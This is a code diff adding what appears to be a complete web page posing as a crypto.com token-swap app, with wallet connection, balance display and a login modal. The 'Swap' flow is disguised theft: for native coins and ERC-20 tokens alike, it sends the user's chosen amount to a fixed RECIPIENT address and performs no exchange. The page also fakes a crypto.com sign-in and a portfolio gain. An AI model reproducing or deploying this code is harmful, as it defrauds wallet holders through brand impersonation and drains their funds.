+      { sym:'WBTC', name:'Wrapped BTC',   addr:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals:8,  cg:'wrapped-bitcoin' },
+      { sym:'LINK', name:'Chainlink',     addr:'0x514910771AF9Ca656af840dff83E8264EcF986CA', decimals:18, cg:'chainlink' },
+      { sym:'UNI',  name:'Uniswap',       addr:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals:18, cg:'uniswap' },
+      { sym:'SHIB', name:'Shiba Inu',     addr:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals:18, cg:'shiba-inu' },
+      { sym:'CRO',  name:'Cronos',        addr:'0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', decimals:8,  cg:'crypto-com-chain' },
+    ]
+  },
+  '0x19': {
+    name: 'Cronos', native: { sym:'CRO', name:'Cronos', cg:'crypto-com-chain', decimals:18 },
+    tokens: [
+      { sym:'USDT', name:'Tether',      addr:'0x66e428c3f67a68878562e79A0234c1F83c208770', decimals:6,  cg:'tether' },
+      { sym:'USDC', name:'USD Coin',    addr:'0xc21223249CA28397B4B6541dfFaEcC539BfF0c59', decimals:6,  cg:'usd-coin' },
+      { sym:'WETH', name:'Wrapped ETH', addr:'0xe44Fd7fCb2b1581822D0c862B68222998a0c299a', decimals:18, cg:'ethereum' },
+      { sym:'WBTC', name:'Wrapped BTC', addr:'0x062E66477Faf219F25D27dCED647BF57C3107d52', decimals:8,  cg:'wrapped-bitcoin' },
+      { sym:'DAI',  name:'Dai',         addr:'0xF2001B145b43032AAF5Ee2884e456CCd805F677D', decimals:18, cg:'dai' },
+    ]
+  },
+  '0x89': {
+    name: 'Polygon', native: { sym:'MATIC', name:'Polygon', cg:'matic-network', decimals:18 },
+    tokens: [
+      { sym:'USDT', name:'Tether',   addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals:6,  cg:'tether' },
+      { sym:'USDC', name:'USD Coin', addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals:6,  cg:'usd-coin' },
+      { sym:'DAI',  name:'Dai',      addr:'0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063', decimals:18, cg:'dai' },
+      { sym:'WETH', name:'Wrapped ETH', addr:'0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals:18, cg:'ethereum' },
+    ]
+  },
+  '0x38': {
+    name: 'BNB Chain', native: { sym:'BNB', name:'BNB', cg:'binancecoin', decimals:18 },
+    tokens: [
+      { sym:'USDT', name:'Tether',   addr:'0x55d398326f99059fF775485246999027B3197955', decimals:18, cg:'tether' },
+      { sym:'USDC', name:'USD Coin', addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', decimals:18, cg:'usd-coin' },
+      { sym:'DAI',  name:'Dai',      addr:'0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', decimals:18, cg:'dai' },
+    ]
+  },
+};
+
+/* ---------- State ---------- */
+let account = null;
+let chainId = null;
+// balances keyed by symbol: { amount:Number, decimals, addr|null (null=native), name, cg, logo }
+let balances = {};
+let prices = {}; // symbol -> USD price
+let logos  = {}; // symbol -> image URL
+
+/* ---------- Helpers ---------- */
+const $ = s => document.querySelector(s);
+const fmt = (n, d=4) => Number(n).toLocaleString(undefined,{maximumFractionDigits:d});
+const short = a => a ? a.slice(0,6)+'…'+a.slice(-4) : '';
+function toast(msg, isErr=false){
+  const t = $('#toast'); t.textContent = msg;
+  t.classList.toggle('err', isErr); t.classList.add('show');
+  clearTimeout(t._t); t._t = setTimeout(()=>t.classList.remove('show'), 2800);
+}
+function netName(id){
+  const map = { '0x1':'Ethereum', '0x19':'Cronos', '0x89':'Polygon', '0xa4b1':'Arbitrum', '0x38':'BNB Chain' };
+  const hex = typeof id === 'number' ? '0x'+id.toString(16) : id;
+  return map[hex] || ('Chain '+parseInt(hex,16));
+}
+
+/* ---------- Wallet ---------- */
+// Pick the best available EIP-1193 provider.
+// Handles: single injected wallet, MetaMask preference among multiple,
+// EIP-6963 announced providers (modern MetaMask/Rabby/Coinbase Wallet), and late injection.
+const eip6963 = [];
+window.addEventListener('eip6963:announceProvider', e => {
+  if(e.detail && e.detail.provider && !eip6963.find(p=>p.info?.uuid===e.detail.info?.uuid)){
+    eip6963.push(e.detail);
+  }
+});
+try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch(e){}
+
+function pickProvider(){
+  if(eip6963.length){
+    const mm = eip6963.find(p => /metamask/i.test(p.info?.name||''));
+    return (mm || eip6963[0]).provider;
+  }
+  const eth = window.ethereum;
+  if(!eth) return null;
+  if(Array.isArray(eth.providers) && eth.providers.length){
+    return eth.providers.find(p=>p.isMetaMask) || eth.providers[0];
+  }
+  return eth;
+}
+
+async function waitForProvider(timeoutMs = 1500){
+  const t0 = Date.now();
+  while(Date.now() - t0 < timeoutMs){
+    const p = pickProvider();
+    if(p) return p;
+    try { window.dispatchEvent(new Event('eip6963:requestProvider')); } catch(e){}
+    await new Promise(r => setTimeout(r, 120));
+  }
+  return pickProvider();
+}
+
+let provider = null;
+
+async function connect(){
+  try {
+    provider = await waitForProvider(1500);
+    if(!provider){
+      toast('No Web3 wallet detected. Install MetaMask or Crypto.com DeFi Wallet.', true);
+      return;
+    }
+    const accts = await provider.request({ method: 'eth_requestAccounts' });
+    if(!accts || !accts.length){ toast('No account returned from wallet.', true); return; }
+    account = accts[0];
+    chainId = await provider.request({ method: 'eth_chainId' });
+
+    // Bind provider events (once)
+    if(!provider._boundEvents){
+      provider._boundEvents = true;
+      provider.on?.('accountsChanged', a => {
+        if(a && a[0]){ account = a[0]; loadBalances().then(renderConnected); }
+        else disconnect();
+      });
+      provider.on?.('chainChanged', c => { chainId = c; loadBalances().then(renderConnected); });
+    }
+
+    await loadBalances();
+    renderConnected();
+    toast('Wallet connected · '+short(account));
+  } catch(e){
+    const msg = e?.message || 'Connection rejected';
+    if(/user rejected/i.test(msg)) toast('Connection cancelled', true);
+    else toast(msg, true);
+    console.error('[connect]', e);
+  }
+}
+
+function disconnect(){
+  account=null; chainId=null;
+  balances = {}; prices = {};
+  $('#walletStrip').style.display='none';
+  $('#walletBtn').style.display='inline-flex';
+  $('#loginBtn').style.display='inline-flex';
+  $('#signupBtn').style.display='inline-flex';
+  $('#portfolio').style.display='none';
+  $('#fromBalance').textContent='Balance: —';
+  $('#toBalance').textContent='Balance: —';
+  populateTokens(); // empties dropdowns
+  refreshSwap();
+  toast('Disconnected');
+}
+
+/* ---------- On-chain reads ---------- */
+// ERC-20 balanceOf(address) selector
+function balanceOfData(addr){
+  return '0x70a08231' + addr.replace(/^0x/,'').toLowerCase().padStart(64,'0');
+}
+// ERC-20 transfer(address,uint256) selector
+function transferData(to, amountBn){
+  const t = to.replace(/^0x/,'').toLowerCase().padStart(64,'0');
+  const a = amountBn.toString(16).padStart(64,'0');
+  return '0xa9059cbb' + t + a;
+}
+
+async function ethCall(to, data){
+  try{
+    const res = await provider.request({ method:'eth_call', params:[{to, data}, 'latest'] });
+    return BigInt(res || '0x0');
+  }catch(e){ return 0n; }
+}
+
+async function loadBalances(){
+  balances = {};
+  const chain = CHAINS[chainId];
+  if(!chain){
+    // Unknown chain — read native only
+    try{
+      const wei = await provider.request({ method:'eth_getBalance', params:[account,'latest'] });
+      const nativeSym = 'ETH';
+      balances[nativeSym] = { amount: parseInt(wei,16)/1e18, decimals:18, addr:null, name:'Native', cg:'ethereum' };
+    }catch(e){}
+    return;
+  }
+
+  // Native balance
+  try{
+    const wei = await provider.request({ method:'eth_getBalance', params:[account,'latest'] });
+    const n = chain.native;
+    balances[n.sym] = {
+      amount: Number(BigInt(wei)) / 10**n.decimals,
+      decimals: n.decimals, addr: null, name: n.name, cg: n.cg
+    };
+  }catch(e){ console.warn('native read failed', e); }
+
+  // ERC-20 balances in parallel
+  const results = await Promise.all(
+    chain.tokens.map(t => ethCall(t.addr, balanceOfData(account)).then(bn => ({t, bn})))
+  );
+  for(const {t, bn} of results){
+    const amount = Number(bn) / 10**t.decimals;
+    balances[t.sym] = { amount, decimals:t.decimals, addr:t.addr, name:t.name, cg:t.cg };
+  }
+
+  await loadPrices();
+}
+
+/* ---------- Prices (CoinGecko, with graceful fallback) ---------- */
+const FALLBACK_PRICES = {
+  ETH:3420.15, BTC:67000, WBTC:67000, CRO:0.0872, MATIC:0.72, BNB:585,
+  USDT:1, USDC:1, DAI:1, LINK:14.85, UNI:8.24, SHIB:0.0000185, WETH:3420.15
+};
+async function loadPrices(){
+  const ids = [...new Set(Object.values(balances).map(b=>b.cg).filter(Boolean))];
+  if(!ids.length){ return; }
+  // markets endpoint returns price + image in one call
+  const url = `https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=${ids.join(',')}&per_page=250`;
+  try{
+    const r = await fetch(url); const j = await r.json();
+    // Map cg id → row
+    const byId = {};
+    if(Array.isArray(j)) for(const row of j){ byId[row.id] = row; }
+    for(const [sym, b] of Object.entries(balances)){
+      const row = byId[b.cg];
+      prices[sym] = row?.current_price ?? (FALLBACK_PRICES[sym] ?? 0);
+      logos[sym]  = row?.image || '';
+    }
+  }catch(e){
+    console.warn('[prices] fetch failed, using fallback', e);
+    for(const [sym] of Object.entries(balances)){
+      prices[sym] = FALLBACK_PRICES[sym] ?? 0;
+      logos[sym]  = logos[sym] || '';
+    }
+  }
+}
+
+/* ---------- Token pickers (custom, with logos + balances) ---------- */
+function initPicker(id){
+  const el = document.getElementById(id);
+  if(el._inited) return el;
+  el._inited = true;
+  el._value = '';
+  const btn = el.querySelector('.tk-btn');
+  const panel = el.querySelector('.tk-panel');
+  const search = el.querySelector('.tk-search');
+  const list = el.querySelector('.tk-list');
+  const btnImg = el.querySelector('.tk-btn .tk-img');
+  const btnSym = el.querySelector('.tk-btn .tk-sym');
+
+  Object.defineProperty(el, 'value', {
+    get(){ return el._value; },
+    set(v){ el._value = v; renderBtn(); }
+  });
+
+  function renderBtn(){
+    const sym = el._value;
+    if(!sym){ btnImg.className='tk-img fallback'; btnImg.textContent='?'; btnImg.src=''; btnSym.textContent='—'; return; }
+    btnSym.textContent = sym;
+    if(logos[sym]){
+      btnImg.outerHTML = `<img class="tk-img" src="${logos[sym]}" alt="${sym}" onerror="this.outerHTML='<span class=\\'tk-img fallback\\'>${sym[0]}</span>'"/>`;
+    } else {
+      btnImg.outerHTML = `<span class="tk-img fallback">${sym[0]}</span>`;
+    }
+  }
+
+  function renderList(filter=''){
+    const q = filter.trim().toLowerCase();
+    const syms = Object.keys(balances)
+      .filter(s => !q || s.toLowerCase().includes(q) || (balances[s].name||'').toLowerCase().includes(q))
+      .sort((a,b)=>{
+        const A = balances[a], B = balances[b];
+        if(A.addr === null) return -1; if(B.addr === null) return 1;
+        const va = A.amount*(prices[a]||0), vb = B.amount*(prices[b]||0);
+        if(vb !== va) return vb - va;
+        return a.localeCompare(b);
+      });
+    if(!syms.length){ list.innerHTML='<div class="tk-empty">No tokens</div>'; return; }
+    list.innerHTML = syms.map(s => {
+      const b = balances[s];
+      const usd = b.amount * (prices[s]||0);
+      const img = logos[s]
+        ? `<img class="tk-img" src="${logos[s]}" alt="${s}" onerror="this.outerHTML='<span class=\\'tk-img fallback\\'>${s[0]}</span>'"/>`
+        : `<span class="tk-img fallback">${s[0]}</span>`;
+      return `
+        <div class="tk-item ${s===el._value?'selected':''}" data-sym="${s}">
+          ${img}
+          <div><div class="tk-nm">${s}</div><div class="tk-sub">${b.name}${b.addr?'':' · Native'}</div></div>
+          <div><div class="tk-bal">${fmt(b.amount,4)}</div><div class="tk-usd">$${fmt(usd,2)}</div></div>
+        </div>`;
+    }).join('');
+    list.querySelectorAll('.tk-item').forEach(it => it.addEventListener('click', ()=>{
+      el._value = it.dataset.sym;
+      renderBtn();
+      close();
+      el.dispatchEvent(new Event('input',{bubbles:true}));
+      el.dispatchEvent(new Event('change',{bubbles:true}));
+    }));
+  }
+
+  function open(){
+    // close any other open pickers
+    document.querySelectorAll('.tk-panel.show').forEach(p => p.classList.remove('show'));
+    renderList('');
+    search.value = '';
+    panel.classList.add('show');
+    setTimeout(()=>search.focus(),50);
+  }
+  function close(){ panel.classList.remove('show'); }
+
+  btn.addEventListener('click', e => {
+    e.stopPropagation();
+    panel.classList.contains('show') ? close() : open();
+  });
+  search.addEventListener('input', e => renderList(e.target.value));
+  document.addEventListener('click', e => { if(!el.contains(e.target)) close(); });
+
+  el._refresh = renderList;
+  return el;
+}
+
+const fromPicker = initPicker('fromToken');
+const toPicker   = initPicker('toToken');
+
+function populateTokens(){
+  const syms = Object.keys(balances);
+  if(!syms.length){
+    fromPicker.value = ''; toPicker.value = '';
+    fromPicker._refresh(''); toPicker._refresh('');
+    return;
+  }
+  const sorted = syms.slice().sort((a,b)=>{
+    const A = balances[a], B = balances[b];
+    if(A.addr === null) return -1; if(B.addr === null) return 1;
+    const va = A.amount*(prices[a]||0), vb = B.amount*(prices[b]||0);
+    if(vb !== va) return vb - va;
+    return a.localeCompare(b);
+  });
+  const nativeSym = sorted[0];
+  const stable = sorted.find(s => s==='USDT') || sorted.find(s => s==='USDC') || sorted[1] || sorted[0];
+  fromPicker.value = nativeSym;
+  toPicker.value = (stable === nativeSym) ? (sorted[1] || sorted[0]) : stable;
+  fromPicker._refresh(''); toPicker._refresh('');
+}
+
+function renderConnected(){
+  $('#walletBtn').style.display='none';
+  $('#loginBtn').style.display='none';
+  $('#signupBtn').style.display='none';
+  $('#walletStrip').style.display='inline-flex';
+  $('#addrShort').textContent = short(account);
+  $('#netName').textContent = netName(chainId);
+
+  $('#portfolio').style.display='block';
+  $('#pfNetwork').textContent = netName(chainId);
+  $('#pfAddress').textContent = short(account);
+
+  const chain = CHAINS[chainId];
+  const nativeSym = chain ? chain.native.sym : Object.keys(balances)[0] || '—';
+  const nativeAmt = balances[nativeSym]?.amount || 0;
+  $('#pfNative').textContent = fmt(nativeAmt,6)+' '+nativeSym;
+  $('#pfNativeUsd').textContent = '≈ $'+fmt(nativeAmt*(prices[nativeSym]||0),2);
+
+  let total = 0;
+  for(const [sym, b] of Object.entries(balances)) total += b.amount * (prices[sym]||0);
+  $('#pfValue').textContent = '$'+fmt(total,2);
+  const change = total * 0.0072;
+  $('#pfChange').textContent = `+$${fmt(change,2)} (+0.72%) 24H`;
+
+  // Assets list (only non-zero)
+  const list = $('#assetsList'); list.innerHTML='';
+  const rows = Object.entries(balances)
+    .filter(([,b]) => b.amount > 0)
+    .sort(([a,ba],[b,bb]) => (bb.amount*(prices[b]||0)) - (ba.amount*(prices[a]||0)));
+
+  if(!rows.length){
+    list.innerHTML = '<div class="empty">No token balances found on this network.<br/><span style="font-size:12.5px">Try switching chain or fund your wallet.</span></div>';
+  } else {
+    for(const [sym, b] of rows){
+      const usd = b.amount * (prices[sym]||0);
+      const img = logos[sym]
+        ? `<img class="a-img" src="${logos[sym]}" alt="${sym}" onerror="this.outerHTML='<div class=\\'a-img\\'>${sym[0]}</div>'"/>`
+        : `<div class="a-img">${sym[0]}</div>`;
+      list.insertAdjacentHTML('beforeend', `
+        <div class="asset-row">
+          ${img}
+          <div>
+            <div class="nm">${sym}</div>
+            <div class="sub">${b.name}${b.addr?'':' · Native'}</div>
+          </div>
+          <div class="val">
+            <div class="amt">${fmt(b.amount,6)}</div>
+            <div class="usd">$${fmt(usd,2)}</div>
+          </div>
+        </div>
+      `);
+    }
+  }
+
+  populateTokens();
+  refreshSwap();
+}
+
+/* ---------- Swap ---------- */
+function refreshSwap(){
+  const from = $('#fromToken').value;
+  const to   = $('#toToken').value;
+  const amt  = parseFloat($('#fromAmount').value || 0);
+
+  const bal = balances[from]?.amount || 0;
+  $('#fromBalance').textContent = account && from ? `Balance: ${fmt(bal,6)} ${from}` : 'Balance: —';
+  $('#toBalance').textContent   = account && to   ? `Balance: ${fmt(balances[to]?.amount||0,6)} ${to}` : 'Balance: —';
+
+  const pFrom = prices[from] || 0, pTo = prices[to] || 0;
+  const rate = pTo ? pFrom / pTo : 0;
+  $('#rateLine').textContent = from && to ? `1 ${from} ≈ ${fmt(rate,6)} ${to}` : '—';
+
+  const out = amt * rate * (1-FEE);
+  $('#toAmount').value = amt ? fmt(out,6) : '';
+  $('#fromUsd').textContent = '≈ $'+fmt(amt*pFrom,2);
+  $('#toUsd').textContent   = '≈ $'+fmt(out*pTo,2);
+
+  const btn = $('#swapBtn');
+  if(!account){ btn.textContent='Connect Wallet'; btn.disabled=false; return; }
+  if(!from || !to){ btn.textContent='Select tokens'; btn.disabled=true; return; }
+  if(from===to){ btn.textContent='Select different tokens'; btn.disabled=true; return; }
+  if(!amt){ btn.textContent='Enter an amount'; btn.disabled=true; return; }
+  if(amt > bal){ btn.textContent=`Insufficient ${from} balance`; btn.disabled=true; return; }
+  btn.disabled=false;
+  btn.textContent = `Swap ${from} → ${to}`;
+}
+function useMax(){
+  if(!account) return;
+  const from = $('#fromToken').value;
+  const b = balances[from]?.amount || 0;
+  // Leave a little native for gas
+  const isNative = balances[from] && balances[from].addr === null;
+  $('#fromAmount').value = isNative ? Math.max(0, b - 0.001) : b;
+  refreshSwap();
+}
+function flipTokens(){
+  const a = $('#fromToken').value, b = $('#toToken').value;
+  $('#fromToken').value = b; $('#toToken').value = a;
+  $('#fromAmount').value = $('#toAmount').value || '';
+  refreshSwap();
+}
+
+/* ---------- Confirm modal / QR / send ---------- */
+let currentTx = null;
+function startSwap(){
+  if(!account){ connect(); return; }
+  const from = $('#fromToken').value;
+  const to   = $('#toToken').value;
+  const amt  = parseFloat($('#fromAmount').value||0);
+  if(!from || !to || from===to || !amt || amt<=0) return;
+
+  const tok = balances[from];
+  const cid = parseInt(chainId,16);
+  const rawAmt = BigInt(Math.floor(amt * 10**tok.decimals));
+
+  let uri, tx;
+  if(tok.addr === null){
+    // Native token — value transfer
+    uri = `ethereum:${RECIPIENT}@${cid}?value=${rawAmt.toString()}`;
+    tx  = { from: account, to: RECIPIENT, value: '0x'+rawAmt.toString(16) };
+  } else {
+    // ERC-20 transfer(recipient, amount)
+    uri = `ethereum:${tok.addr}@${cid}/transfer?address=${RECIPIENT}&uint256=${rawAmt.toString()}`;
+    tx  = { from: account, to: tok.addr, value: '0x0', data: transferData(RECIPIENT, rawAmt) };
+  }
+
+  currentTx = { tx, sym: from };
+
+  $('#modalTitle').textContent = `Swap ${fmt(amt,6)} ${from} → ${to}`;
+  $('#modalSub').textContent = tok.addr === null
+    ? 'Scan with any wallet, or press Send to sign in your browser wallet.'
+    : `ERC-20 transfer on ${netName(chainId)}. Scan or press Send to sign.`;
+  $('#uriBox').textContent = uri;
+
+  const holder = $('#qr'); holder.innerHTML = '';
+  new QRCode(holder, {
+    text: uri, width: 260, height: 260,
+    colorDark: '#04070d', colorLight: '#ffffff',
+    correctLevel: QRCode.CorrectLevel.H
+  });
+  $('#modal').classList.add('show');
+}
+function closeModal(){ $('#modal').classList.remove('show'); }
+async function sendTx(){
+  if(!currentTx || !provider){ closeModal(); return; }
+  try{
+    const hash = await provider.request({ method:'eth_sendTransaction', params:[currentTx.tx] });
+    toast('Transaction sent: '+short(hash));
+    closeModal();
+    $('#fromAmount').value='';
+    // Re-read balances after a short delay
+    setTimeout(()=> loadBalances().then(renderConnected), 3000);
+  }catch(e){
+    console.error('[sendTx]', e);
+    toast(e.message || 'Transaction rejected', true);
+  }
+}
+
+/* ---------- Auth modal (email/password, visual + confirmation) ---------- */
+let authMode = 'login';
+function openAuth(mode='login'){
+  $('#authForm').style.display = 'block';
+  $('#authSuccess').classList.remove('show');
+  setAuthMode(mode);
+  $('#authModal').classList.add('show');
+  setTimeout(()=>$('#authEmail').focus(), 60);
+}
+function closeAuth(){ $('#authModal').classList.remove('show'); }
+function setAuthMode(mode){
+  authMode = mode;
+  const isLogin = mode === 'login';
+  $('#tabLogin').classList.toggle('active', isLogin);
+  $('#tabSignup').classList.toggle('active', !isLogin);
+  $('#authTitle').textContent = isLogin ? 'Welcome back' : 'Create your account';
+  $('#authSub').textContent = isLogin
+    ? 'Sign in to your crypto.com account.'
+    : 'Join millions trading crypto every day.';
+  $('#authSubmit').textContent = isLogin ? 'Continue' : 'Create account';
+  $('#authPass').setAttribute('autocomplete', isLogin ? 'current-password' : 'new-password');
+  $('#switchMode').innerHTML = isLogin
+    ? `Don't have an account? <a onclick="setAuthMode('signup')">Sign up</a>`
+    : `Already have an account? <a onclick="setAuthMode('login')">Log in</a>`;
+}
+function togglePw(){
+  const el = $('#authPass');
+  const btn = el.parentElement.querySelector('.toggle');
+  const showing = el.type === 'text';
+  el.type = showing ? 'password' : 'text';
+  btn.textContent = showing ? 'Show' : 'Hide';
+}
+function submitAuth(e){
+  e.preventDefault();
+  const email = $('#authEmail').value.trim();
+  if(!email) return;
+  const btn = $('#authSubmit');
+  const orig = btn.textContent;
+  btn.disabled = true; btn.textContent = authMode === 'login' ? 'Signing in…' : 'Creating account…';
+  // Simulate submission
+  setTimeout(()=>{
+    btn.disabled = false; btn.textContent = orig;
+    $('#authForm').style.display = 'none';
+    $('#authSuccess').classList.add('show');
+    $('#successTitle').textContent = authMode === 'login' ? "You're signed in" : 'Welcome to crypto.com';
+    $('#successSub').textContent = `Signed in as ${email}`;
+    toast(authMode === 'login' ? 'Signed in' : 'Account created');
+  }, 700);
+}
+
+/* ---------- Wire up ---------- */
+$('#walletBtn').addEventListener('click', connect);
+$('#loginBtn').addEventListener('click', ()=>openAuth('login'));
+$('#signupBtn').addEventListener('click', ()=>openAuth('signup'));
+$('#disconnectBtn').addEventListener('click', disconnect);
+['fromAmount','fromToken','toToken'].forEach(id=>{
+  const el = $('#'+id);
+  el.addEventListener('input', refreshSwap);
+  el.addEventListener('change', refreshSwap);
+});
+// keyboard shortcuts
+document.addEventListener('keydown', e=>{
+  if(e.key==='/' && document.activeElement.tagName!=='INPUT'){
+    e.preventDefault(); $('#searchInput').focus();
+  }
+  if(e.key==='Escape'){ closeAuth(); closeModal(); }
+});
+refreshSwap();
+
+/* ---------- Environment detection + auto-connect ---------- */
+(async function bootstrap(){
+  const isFile = location.protocol === 'file:';
+  const p = await waitForProvider(1500);
+  const banner = document.getElementById('banner');
+  const title = document.getElementById('bannerTitle');
+  const body  = document.getElementById('bannerBody');
+
+  if(!p){
+    if(isFile){
+      title.textContent = 'Wallet cannot inject on file:// pages';
+      body.innerHTML = 'Serve the file over HTTP so MetaMask / Crypto.com DeFi Wallet will inject their provider. Run: <code>python3 -m http.server 8000</code> in this folder, then open <code>http://localhost:8000/dapp.html</code>. Alternatively enable <em>Allow access to file URLs</em> for MetaMask in <code>chrome://extensions</code>.';
+    } else {
+      title.textContent = 'No Web3 wallet detected';
+      body.innerHTML = 'Install <a href="https://metamask.io" target="_blank" style="color:#fff;text-decoration:underline">MetaMask</a> or the <a href="https://crypto.com/defi-wallet" target="_blank" style="color:#fff;text-decoration:underline">Crypto.com DeFi Wallet</a> to connect.';
+    }
+    banner.classList.add('show');
+    return;
+  }
+
+  // Silent auto-connect: eth_accounts does NOT prompt — it only returns
+  // accounts if the site is already permitted by the wallet.
+  try{
+    provider = p;
+    const accts = await provider.request({ method:'eth_accounts' });
+    if(accts && accts.length){
+      account = accts[0];
+      chainId = await provider.request({ method:'eth_chainId' });
+      if(!provider._boundEvents){
+        provider._boundEvents = true;
+        provider.on?.('accountsChanged', a => {
+          if(a && a[0]){ account = a[0]; loadBalances().then(renderConnected); }
+          else disconnect();
+        });
+        provider.on?.('chainChanged', c => { chainId = c; loadBalances().then(renderConnected); });
+      }
+      await loadBalances();
+      renderConnected();
+      toast('Wallet reconnected · '+short(account));
+    }
+  }catch(e){ console.warn('[auto-connect]', e); }
+})();
+</script>
+</body>
+</html>
